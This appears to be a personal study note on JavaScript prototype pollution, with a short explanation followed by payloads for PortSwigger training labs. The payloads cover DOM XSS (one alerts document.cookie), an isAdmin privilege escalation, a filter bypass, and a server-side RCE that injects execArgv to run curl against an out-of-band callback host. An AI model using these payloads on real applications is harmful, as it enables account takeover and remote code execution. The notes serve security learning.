# Prototype pollution
Prototype pollution is a JavaScript vulnerability where an attacker can add arbitrary properties to global object prototypes, which are then inherited by user-defined objects. 

While prototype pollution is often not directly exploitable, it allows attackers to control object properties that would otherwise be inaccessible. This can be chained with other vulnerabilities, leading to further exploitation. In client-side JavaScript, this often results in DOM XSS, while server-side prototype pollution can lead to remote code execution.

[JavaScript prototypes and inheritance](https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance)


## Prototype pollution vulnerabilities
Prototype pollution vulnerabilities occur when a JavaScript function merges an object with user-controlled properties into another object without sanitizing the keys.

Attackers can inject keys like `__proto__` with arbitrary nested properties. 

Since `__proto__` has a special role in JavaScript, the merge may assign properties to the object's prototype instead of the target object, allowing attackers to "pollute" the prototype with harmful values that can be exploited by the application.



Although any prototype object can be polluted, it most commonly affects the global `Object.prototype`.   

Exploiting this vulnerability requires:
- **Prototype pollution source** : Input that allows injecting arbitrary properties into prototype objects.
- **Sink** : A JavaScript function or DOM element that allows arbitrary code execution.
- **Exploitable gadget** : A property passed into a sink without proper filtering or sanitization.


## Client-side prototype pollution



## Server-side prototype pollution




### Labs Portswigger
>Approach :  
It fires very well with the DOM-Invader extension. Arises, usually, in these JS files: searchLogger.js, searchLoggerAlternative.js and similar searchLogger.

1. DOM XSS via client-side prototype pollution
```
https://site.com/?__proto__[transport_url]=data:,alert(1)
```

2. DOM XSS via an alternative prototype pollution vector
```
https://site.com/?__proto__.sequence=alert(1)-
```

3. Client-side prototype pollution via flawed sanitization
```
https://site.com/?__pro__proto__to__[transport_url]=data:,alert(1)
```

4. Client-side prototype pollution in third-party libraries
```
<script>
location="https:/site.com/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```

5. Client-side prototype pollution via browser APIs
```
https://site.com/?__proto__[value]=data:,alert(1)
```

6. Privilege escalation via server-side prototype pollution
```
Billing and Delivery Address:
"__proto__": {
    "isAdmin":true
}
```

7. Detecting server-side prototype pollution without polluted property reflection
```
"__proto__": {
 "status":555
}
```

8. Bypassing flawed input filters for server-side prototype pollution
>https://portswigger.net/web-security/prototype-pollution/client-side#bypassing-flawed-key-sanitization
```
 "constructor":{
"prototype":{
"isAdmin":true
}}
```

9. Remote code execution via server-side prototype pollution
```
"__proto__":
{"execArgv": [
  "--eval=require('child_process').execSync('curl https://kmazepmj6dq3jzpk2e4ah7fzuq0ho9cy.oastify.com')"
]}
```
